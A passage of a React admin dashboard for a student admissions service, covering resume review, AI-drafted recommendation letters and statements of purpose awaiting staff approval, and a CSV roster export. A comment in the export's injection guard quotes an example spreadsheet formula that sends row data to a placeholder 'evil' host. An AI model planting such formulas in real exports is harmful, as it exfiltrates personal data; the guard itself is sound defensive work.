              type="button"
              onClick={goPrev}
              disabled={atStart}
              className="inline-flex items-center gap-2 border-2 border-stone-900 bg-white px-5 py-2.5 text-base font-semibold text-black transition hover:bg-stone-100 disabled:cursor-not-allowed disabled:opacity-30"
            >
              <ArrowLeft className="h-5 w-5" /> Prev
            </button>
            <button
              type="button"
              onClick={goNext}
              disabled={atEnd}
              className="inline-flex items-center gap-2 border-2 border-[#cc785c] bg-[#cc785c] px-5 py-2.5 text-base font-semibold text-white transition hover:bg-[#b86a4f] hover:border-[#b86a4f] disabled:cursor-not-allowed disabled:opacity-30"
            >
              Next <ArrowRight className="h-5 w-5" />
            </button>
          </div>
        </div>
      </div>

      <div className="mb-4">
        {step?.eyebrow && (
          <p className="text-xs font-semibold uppercase tracking-[0.2em] text-stone-600">
            {step.eyebrow}
          </p>
        )}
        <h2 className="mt-1.5 font-serif text-3xl leading-tight text-black">{step?.title}</h2>
      </div>

      {step?.kind === "page" && (
        <ChapterSummaryBlock
          chapter={{ id: step.page.id, title: step.chapterTitle, pages: [step.page] }}
          studentId={student.student_id}
          headless
          autofilledKeys={autofilledKeys}
        />
      )}
      {step?.kind === "page-with-doc" && (
        <div className="space-y-6">
          <ChapterSummaryBlock
            chapter={{ id: step.page.id, title: step.chapterTitle, pages: [step.page] }}
            studentId={student.student_id}
            headless
            hideFilePreviews
            autofilledKeys={autofilledKeys}
          />
          <ExtractionStep file={step.file} fieldIndex={fieldIndex} studentId={student.student_id} />
        </div>
      )}
      {step?.kind === "doc-only" && (
        <ExtractionStep file={step.file} fieldIndex={fieldIndex} studentId={student.student_id} />
      )}
      {step?.kind === "empty" && (
        <p className="border border-stone-200 bg-white px-4 py-3 text-black">
          Student hasn't started filling the form yet.
        </p>
      )}
      {step?.kind === "resumes" && (
        <ResumesStep
          resumes={resumes}
          student={student}
          regen={regen}
          onRegen={handleRegen}
        />
      )}
      {step?.kind === "ai-suggestions" && (
        <AiSuggestionsStep studentId={student.student_id} />
      )}
      {step?.kind === "required" && (
        <RequiredDocsStaff studentId={student.student_id} role={role} />
      )}
    </div>
  );
}

// ============================================================
// ResumesStep — extracted from the old Section so the paginated
// detail view can drop it in as one step. Pure presentation;
// regenerate handler comes from the parent so it can refresh detail.
// ============================================================
function ResumesStep({ resumes, student, regen, onRegen }) {
  if (!resumes || resumes.length === 0) {
    return <p className="text-black">No resumes generated yet.</p>;
  }
  return (
    <div className="space-y-3">
      {resumes.map((r) => {
        const snapshot = parseSnapshot(r.source_snapshot);
        const stale =
          r.status === "succeeded" &&
          student?.updated_at &&
          r.created_at &&
          new Date(student.updated_at).getTime() > new Date(r.created_at).getTime() + 5_000;
        return (
          <div key={r.id} className="border border-stone-200 bg-white">
            <header className="flex items-center justify-between gap-3 border-b border-stone-100 px-3 py-2">
              <span className="text-black">
                {r.label || `Resume #${r.id}`}
                {stale && (
                  <span
                    className="ml-2 rounded-sm bg-amber-100 px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.15em] text-amber-800"
                    title={`Student edited their data after this resume was generated (${humanRelative(student.updated_at)} vs ${humanRelative(r.created_at)})`}
                  >
                    may be stale
                  </span>
                )}
              </span>
              <div className="flex items-center gap-3">
                <span className="text-[10px] uppercase tracking-[0.15em] text-black">
                  {snapshot?.actual_words && snapshot?.target_words
                    ? <span title={snapshot.length_warning || ""} className={snapshot.length_warning ? "text-amber-700" : ""}>
                        {snapshot.actual_words}w / {snapshot.target_words}w target
                      </span>
                    : r.length_words ? `${r.length_words}w` : r.length_pages ? `${r.length_pages}p` : ""}
                  {" · "}
                  <span className={
                    r.status === "succeeded" ? "text-emerald-700"
                    : r.status === "failed" ? "text-red-700"
                    : "text-amber-700"
                  }>{r.status}</span>
                </span>
                {(r.status === "succeeded" || r.status === "failed") && (
                  <button
                    type="button"
                    onClick={() => onRegen(r.id)}
                    disabled={regen[r.id]?.busy}
                    className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-0.5 text-[10px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700 hover:text-black disabled:opacity-50"
                  >
                    <RefreshCw className={`h-3 w-3 ${regen[r.id]?.busy ? "animate-spin" : ""}`} />
                    {regen[r.id]?.busy ? "Starting…" : "Regenerate"}
                  </button>
                )}
              </div>
            </header>
            {regen[r.id]?.err && (
              <p className="border-b border-stone-100 bg-red-50 px-3 py-1.5 text-[10px] text-red-700">
                {regen[r.id].err}
              </p>
            )}
            {snapshot?.length_warning && (
              <p className="border-b border-stone-100 bg-amber-50 px-3 py-1.5 text-[10px] text-amber-800">
                ⚠ {snapshot.length_warning}
              </p>
            )}
            {r.content_json ? (
              <div className="max-h-[600px] overflow-auto bg-white">
                <div className="flex justify-end px-3 pt-3 print:hidden">
                  <a
                    href={`/api/students/${student.student_id}/resumes/${r.id}/print`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-0.5 text-[10px] uppercase tracking-[0.15em] text-black transition hover:border-stone-700"
                  >
                    <Download className="h-3 w-3" />
                    Download PDF
                  </a>
                </div>
                <ResumeTemplate payload={r.content_json} />
              </div>
            ) : r.content_md ? (
              <div className="max-h-[600px] overflow-auto bg-white px-4 py-3">
                <ResumeMarkdown>{r.content_md}</ResumeMarkdown>
              </div>
            ) : r.error ? (
              <p className="px-3 py-2 text-[10px] text-red-700">{String(r.error).slice(0, 300)}</p>
            ) : (
              <p className="px-3 py-2 text-[10px] text-black">Generation in progress…</p>
            )}
          </div>
        );
      })}
    </div>
  );
}

// Best-effort decode of the source_snapshot column: server stringifies
// it on write but node-postgres may return it pre-parsed (jsonb) or
// as a string depending on driver settings. Handle both. Logging on
// failure (rather than swallowing) so a corrupt row doesn't silently
// hide the word-count + stale signals from staff.
function parseSnapshot(s) {
  if (!s) return null;
  if (typeof s === "object") return s;
  try { return JSON.parse(s); } catch (e) {
    console.warn("[StudentsAdmin] source_snapshot parse failed:", e?.message);
    return null;
  }
}

// Activity label per row. The list endpoint's `updated_at` is set
// even on row-creation, so a brand-new student would otherwise read
// as "last active just now" before they've ever logged in. Detect
// the never-touched case (no answers in data) and surface the row's
// creation time instead.
function activityLabel(row) {
  const answers = row?.data?.answers;
  const hasAnyActivity = answers && typeof answers === "object" && Object.keys(answers).length > 0;
  if (!hasAnyActivity) return `Created ${humanRelative(row.created_at || row.updated_at)}`;
  return `Last active ${humanRelative(row.updated_at)}`;
}

// "5m ago" / "3h ago" / "2d ago". Compact enough to fit on a row
// without breaking the layout. Falls back to "—" for missing input
// and clamps clock-skew futures to "just now" instead of "-5m ago".
function humanRelative(iso) {
  if (!iso) return "—";
  const ms = Date.now() - new Date(iso).getTime();
  if (Number.isNaN(ms)) return "—";
  if (ms < 60_000) return "just now";
  const min = Math.round(ms / 60_000);
  if (min < 60) return `${min}m ago`;
  const hr = Math.round(min / 60);
  if (hr < 24) return `${hr}h ago`;
  const d = Math.round(hr / 24);
  if (d < 30) return `${d}d ago`;
  const mo = Math.round(d / 30);
  if (mo < 12) return `${mo}mo ago`;
  return `${Math.round(mo / 12)}y ago`;
}

// AiSuggestionsStep — read-only review of what the AI pipeline drafted
// for this student before any counsellor / admin edits land. Shows two
// buckets:
//   1. Suggested LORs   — kind='lor' rows with student_accepted_at IS NULL.
//                          These are recommender candidates the AI picked
//                          from the intake; the student hasn't yet
//                          accept/rejected them.
//   2. AI-drafted SOP   — the SOP row's staff_draft when it's set and
//                          the row hasn't been admin-approved yet. Once
//                          approved it disappears from this slide (and
//                          surfaces on the student's dashboard).
// Edits live on the next slide ("Required documents") — this slide is
// purely a heads-up so the reviewer can see, side-by-side with the
// resume + intake, what the AI proposed.
// ============================================================
function AiSuggestionsStep({ studentId }) {
  const [docs, setDocs] = useState(null);
  const [err, setErr] = useState(null);

  useEffect(() => {
    let active = true;
    api
      .listRequiredDocsForStudent(studentId)
      .then((list) => { if (active) { setDocs(list); setErr(null); } })
      .catch((e) => { if (active) setErr(e?.message || "Couldn't load suggestions."); });
    return () => { active = false; };
  }, [studentId]);

  if (err) {
    return (
      <p className="inline-flex items-center gap-1 border border-red-300 bg-red-50 px-2 py-1 text-sm text-red-700">
        <AlertCircle className="h-3 w-3" /> {err}
      </p>
    );
  }
  if (docs === null) {
    return <p className="text-black">Loading…</p>;
  }

  const lorSuggestions = docs.filter((d) => d.kind === "lor" && !d.student_accepted_at);
  const sopRow = docs.find((d) => d.kind === "sop");
  const sopDraft = sopRow && sopRow.staff_draft && sopRow.staff_draft.trim() && !sopRow.approved_by_admin_at
    ? sopRow.staff_draft
    : null;

  if (lorSuggestions.length === 0 && !sopDraft) {
    return (
      <p className="border border-stone-200 bg-white px-4 py-3 text-black">
        No AI suggestions yet — either the pipeline hasn't run for this student or every suggestion has already been
        accepted / approved (see the next slide).
      </p>
    );
  }

  return (
    <div className="space-y-6">
      <p className="text-sm text-stone-800">
        Read-only previews of what the AI pipeline produced. Accept / edit / approve happens on the next slide.
      </p>

      <div className="space-y-2">
        <p className="text-[10px] font-semibold uppercase tracking-[0.15em] text-black">Suggested LORs</p>
        {lorSuggestions.length > 0 ? (
          lorSuggestions.map((d) => (
            <div key={d.id} className="border border-[#cc785c] bg-[#fdf4ef] px-4 py-3">
              <p className="text-sm font-semibold text-black">
                {d.recipient_name || "(no name)"}
                <span className="ml-2 text-stone-700">·</span>{" "}
                <span className="font-normal text-stone-800">{d.recipient_role || "(no role)"}</span>
              </p>
              {d.reason_brief && (
                <p className="mt-1 text-sm text-black">{d.reason_brief}</p>
              )}
              <p className="mt-2 text-[11px] uppercase tracking-[0.12em] text-[#cc785c]">
                Pending student review
              </p>
            </div>
          ))
        ) : (
          <p className="border border-dashed border-stone-300 bg-white px-3 py-2 text-sm text-stone-800">
            No LOR suggestions — student already accepted or removed each one.
          </p>
        )}
      </div>

      <div className="space-y-2">
        <p className="text-[10px] font-semibold uppercase tracking-[0.15em] text-black">AI-drafted SOP</p>
        {sopDraft ? (
          <div className="border border-[#cc785c] bg-[#fdf4ef] px-4 py-3">
            <p className="mb-2 text-[11px] uppercase tracking-[0.12em] text-[#cc785c]">
              Awaiting admin approval
            </p>
            <p className="whitespace-pre-wrap text-sm text-black">{sopDraft}</p>
          </div>
        ) : (
          <p className="border border-dashed border-stone-300 bg-white px-3 py-2 text-sm text-stone-800">
            {sopRow && sopRow.approved_by_admin_at
              ? "SOP already approved — see the next slide for the final text."
              : "AI hasn't drafted an SOP for this student yet."}
          </p>
        )}
      </div>
    </div>
  );
}

// ============================================================
// LOR / Internship / SOP rows. Fetches /api/required-docs/student/:id;
// renders each as an editable card with a counsellor draft textarea
// + "Mark done" / "Approve" actions. Bulk "Send requests" button at
// the bottom flips requested_at + deadline_at on every LOR/Internship
// row that's marked done. Server enforces the gate (every L/I row
// must be marked done before the bulk send works).
// ============================================================
function RequiredDocsStaff({ studentId, role }) {
  const [docs, setDocs] = useState(null);
  const [drafts, setDrafts] = useState({}); // local edit buffer keyed by row id
  const [busy, setBusy] = useState({});     // per-row inflight flag
  const [err, setErr] = useState(null);
  const [bulkBusy, setBulkBusy] = useState(false);

  const refresh = useCallback(async () => {
    try {
      const list = await api.listRequiredDocsForStudent(studentId);
      setDocs(list);
      // Re-seed drafts buffer with whatever is currently persisted so
      // the textarea reflects DB state until the user starts typing.
      setDrafts((prev) => {
        const next = { ...prev };
        for (const d of list) {
          if (next[d.id] === undefined) next[d.id] = d.staff_draft || "";
        }
        return next;
      });
      setErr(null);
    } catch (e) {
      setErr(e.message || "Couldn't load required documents.");
    }
  }, [studentId]);

  useEffect(() => { refresh(); }, [refresh]);

  if (docs === null) {
    return <p className=" text-black">Loading…</p>;
  }
  if (docs.length === 0) {
    return (
      <p className=" text-black">
        No rows yet — student hasn't completed intake.
      </p>
    );
  }

  const lors = docs.filter((d) => d.kind === "lor");
  const interns = docs.filter((d) => d.kind === "internship");
  const sop = docs.find((d) => d.kind === "sop");

  const allLIDone = [...lors, ...interns].every((d) => d.marked_done_at);
  const anyLIPending = [...lors, ...interns].some((d) => d.marked_done_at && !d.requested_at);

  const saveDraft = async (id) => {
    setBusy((p) => ({ ...p, [id]: true }));
    try {
      await api.updateRequiredDoc(id, { staff_draft: drafts[id] || "" });
      await refresh();
      setErr(null);
    } catch (e) {
      setErr(e.message);
    } finally {
      setBusy((p) => ({ ...p, [id]: false }));
    }
  };

  const toggleDone = async (doc) => {
    setBusy((p) => ({ ...p, [doc.id]: true }));
    try {
      await api.markRequiredDocDone(doc.id, !!doc.marked_done_at);
      await refresh();
      setErr(null);
    } catch (e) {
      setErr(e.message);
    } finally {
      setBusy((p) => ({ ...p, [doc.id]: false }));
    }
  };

  const toggleApprove = async (doc) => {
    setBusy((p) => ({ ...p, [doc.id]: true }));
    try {
      await api.approveSop(doc.id, !!doc.approved_by_admin_at);
      await refresh();
      setErr(null);
    } catch (e) {
      setErr(e.message);
    } finally {
      setBusy((p) => ({ ...p, [doc.id]: false }));
    }
  };

  const sendBulk = async () => {
    if (!confirm(`Send all marked-done LOR & Internship requests to the student? Deadline: 5 business days.`)) return;
    setBulkBusy(true);
    try {
      await api.sendRequiredDocRequests(studentId);
      await refresh();
      setErr(null);
    } catch (e) {
      setErr(e.message);
    } finally {
      setBulkBusy(false);
    }
  };

  return (
    <div className="space-y-3">
      {err && (
        <p className="inline-flex items-center gap-1 border border-red-300 bg-red-50 px-2 py-1 text-[11px] text-red-700">
          <AlertCircle className="h-3 w-3" /> {err}
        </p>
      )}

      <div className="space-y-2">
        <p className="text-[10px] font-semibold uppercase tracking-[0.15em] text-black">Letters of recommendation</p>
        {lors.length > 0 ? (
          lors.map((d) => (
            <DocStaffCard
              key={d.id}
              doc={d}
              draft={drafts[d.id] ?? ""}
              onDraftChange={(v) => setDrafts((p) => ({ ...p, [d.id]: v }))}
              onSave={() => saveDraft(d.id)}
              onToggleDone={() => toggleDone(d)}
              busy={!!busy[d.id]}
            />
          ))
        ) : (
          <p className="border border-dashed border-stone-300 bg-white px-3 py-2 text-sm text-stone-800">
            Student hasn't sent any LOR briefs yet — no recipient details have been submitted in their intake.
          </p>
        )}
      </div>

      <div className="space-y-2">
        <p className="text-[10px] font-semibold uppercase tracking-[0.15em] text-black">Internships</p>
        {interns.length > 0 ? (
          interns.map((d) => (
            <DocStaffCard
              key={d.id}
              doc={d}
              draft={drafts[d.id] ?? ""}
              onDraftChange={(v) => setDrafts((p) => ({ ...p, [d.id]: v }))}
              onSave={() => saveDraft(d.id)}
              onToggleDone={() => toggleDone(d)}
              busy={!!busy[d.id]}
            />
          ))
        ) : (
          <p className="border border-dashed border-stone-300 bg-white px-3 py-2 text-sm text-stone-800">
            Student hasn't sent any internship briefs yet — no company details have been submitted in their intake.
          </p>
        )}
      </div>

      {sop && (
        <div className="space-y-2">
          <p className="text-[10px] font-semibold uppercase tracking-[0.15em] text-black">Statement of purpose</p>
          <DocStaffCard
            doc={sop}
            draft={drafts[sop.id] ?? ""}
            onDraftChange={(v) => setDrafts((p) => ({ ...p, [sop.id]: v }))}
            onSave={() => saveDraft(sop.id)}
            onToggleApprove={() => toggleApprove(sop)}
            canApprove={role === "admin"}
            busy={!!busy[sop.id]}
          />
        </div>
      )}

      {/* Bulk "Send requests" button at the bottom of the card,
          mirroring the operator's mock per their spec. Only enabled
          when (a) every LOR/Internship row is marked done AND (b) at
          least one of those rows hasn't been sent yet. SOP doesn't
          ride this loop. */}
      <div className="flex flex-wrap items-center justify-between gap-2 border-t border-stone-200 pt-3">
        <span className="text-[11px]  text-black">
          {allLIDone
            ? anyLIPending
              ? "All drafts ready. Send when you're set."
              : "All requests already sent."
            : `Mark every LOR & internship as done before sending.`}
        </span>
        <button
          type="button"
          onClick={sendBulk}
          disabled={!allLIDone || !anyLIPending || bulkBusy}
          className="inline-flex items-center gap-1 border border-stone-900 bg-stone-900 px-3 py-1.5 text-[11px] uppercase tracking-[0.18em] text-white transition hover:bg-stone-800 disabled:cursor-not-allowed disabled:opacity-30"
        >
          {bulkBusy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Send className="h-3 w-3" />}
          Send requests (mock)
        </button>
      </div>
    </div>
  );
}

function DocStaffCard({ doc, draft, onDraftChange, onSave, onToggleDone, onToggleApprove, canApprove, busy }) {
  const isSop = doc.kind === "sop";
  const dirty = (draft || "") !== (doc.staff_draft || "");

  const headline = doc.kind === "lor"
    ? `LOR ${doc.seq} — ${doc.recipient_name || "(no name)"} · ${doc.recipient_role || "(no role)"}`
    : doc.kind === "internship"
    ? `Internship ${doc.seq} — ${doc.company_name || "(no company)"}`
    : "SOP";

  return (
    <div className="border border-stone-200 bg-white p-3">
      <div className="flex flex-wrap items-baseline gap-2">
        <span className="text-black">{headline}</span>
        <span className="ml-auto inline-flex items-center gap-2 text-[10px] uppercase tracking-[0.15em] text-black">
          {doc.requested_at && (
            <span className="border border-blue-300 bg-blue-50 px-1.5 py-0.5 text-blue-800">
              <Clock className="mr-1 inline h-2.5 w-2.5" />
              Sent · deadline {doc.deadline_at}
            </span>
          )}
          {doc.final_file_id && (
            <span className="border border-emerald-300 bg-emerald-50 px-1.5 py-0.5 text-emerald-800">
              Final received
            </span>
          )}
          {isSop && doc.approved_by_admin_at && (
            <span className="border border-emerald-300 bg-emerald-50 px-1.5 py-0.5 text-emerald-800">
              Admin approved
            </span>
          )}
          {!isSop && doc.marked_done_at && !doc.requested_at && (
            <span className="border border-amber-300 bg-amber-50 px-1.5 py-0.5 text-amber-800">
              Marked done — ready to send
            </span>
          )}
          {!doc.marked_done_at && !doc.approved_by_admin_at && !doc.staff_draft && (
            <span className="border border-stone-300 bg-stone-100 px-1.5 py-0.5 text-black">
              Awaiting your draft
            </span>
          )}
        </span>
      </div>

      {/* Student brief — read-only context for the counsellor. */}
      {doc.kind === "lor" && (
        <p className="mt-1 text-[11px]  text-black">
          Reason: {doc.reason_brief || "—"}
        </p>
      )}
      {doc.kind === "internship" && (
        <p className="mt-1 text-[11px]  text-black">
          {doc.company_website ? `Website: ${doc.company_website} — ` : ""}
          What they did: {doc.activity_brief || "—"}
        </p>
      )}

      <textarea
        rows={5}
        value={draft || ""}
        onChange={(e) => onDraftChange(e.target.value)}
        placeholder={isSop ? "Draft the SOP here. Admin must approve before it shows on the student's dashboard." : "Draft the LOR / internship document. The student will print this on the recommender's letterhead."}
        className="mt-2 w-full border border-stone-300 bg-[#faf9f5] p-2 font-serif text-sm text-black outline-none focus:border-stone-900"
      />

      <div className="mt-2 flex flex-wrap items-center gap-2">
        <button
          type="button"
          onClick={onSave}
          disabled={!dirty || busy}
          className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-black hover:border-stone-700 disabled:cursor-not-allowed disabled:opacity-30"
        >
          {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Check className="h-3 w-3" />}
          Save draft
        </button>

        {!isSop && (
          <button
            type="button"
            onClick={onToggleDone}
            disabled={busy || !!doc.requested_at}
            title={doc.requested_at ? "Already sent — cannot un-mark" : ""}
            className={`inline-flex items-center gap-1 border px-2 py-1 text-[10px] uppercase tracking-[0.15em] disabled:cursor-not-allowed disabled:opacity-30 ${
              doc.marked_done_at
                ? "border-emerald-700 bg-emerald-700 text-white hover:bg-emerald-800"
                : "border-stone-300 bg-white text-black hover:border-stone-700"
            }`}
          >
            {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Check className="h-3 w-3" />}
            {doc.marked_done_at ? "Done — click to undo" : "Mark done"}
          </button>
        )}

        {isSop && canApprove && (
          <button
            type="button"
            onClick={onToggleApprove}
            disabled={busy || !doc.staff_draft}
            title={!doc.staff_draft ? "Save a draft first" : ""}
            className={`inline-flex items-center gap-1 border px-2 py-1 text-[10px] uppercase tracking-[0.15em] disabled:cursor-not-allowed disabled:opacity-30 ${
              doc.approved_by_admin_at
                ? "border-emerald-700 bg-emerald-700 text-white hover:bg-emerald-800"
                : "border-stone-300 bg-white text-black hover:border-stone-700"
            }`}
          >
            {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Check className="h-3 w-3" />}
            {doc.approved_by_admin_at ? "Approved — click to undo" : "Approve SOP"}
          </button>
        )}

        {isSop && !canApprove && (
          <span className="text-[10px]  text-black">
            Admin must approve the final SOP.
          </span>
        )}
      </div>
    </div>
  );
}

// CSV download for the visible roster rows. Common parent-meeting prep
// path. Uses RFC 4180 quoting (wrap fields in "..", escape any embedded
// double-quote by doubling it). Date stamps the filename so a counsellor
// downloading twice doesn't overwrite the first export.
function downloadStudentsCsv(rows) {
  if (!rows || rows.length === 0) return;
  const cols = [
    "student_id",
    "username",
    "display_name",
    "intake_complete",
    "file_count",
    "resume_count",
    "lead_name",
    "counsellor_name",
    "created_at",
    "updated_at",
  ];
  // CSV-injection guard. Excel / LibreOffice / Numbers all evaluate any
  // cell starting with =, +, -, @, tab, or carriage return as a formula
  // — which means a student-controlled display_name like
  //   =HYPERLINK("https://evil/?c="&A1, "click")
  // exfiltrates the row when a counsellor opens the export. Prefix
  // those with a single quote (the Excel convention to force literal-
  // text). Then standard RFC 4180 quoting on top.
  const FORMULA_LEAD = /^[=+\-@\t\r]/;
  const esc = (v) => {
    if (v == null) return "";
    let s = String(v);
    if (FORMULA_LEAD.test(s)) s = "'" + s;
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  const lines = [cols.join(",")];
  for (const r of rows) {
    lines.push(cols.map((c) => esc(r[c])).join(","));
  }
  const blob = new Blob([lines.join("\n")], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  const stamp = new Date().toISOString().slice(0, 10);
  a.download = `persona-students-${stamp}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
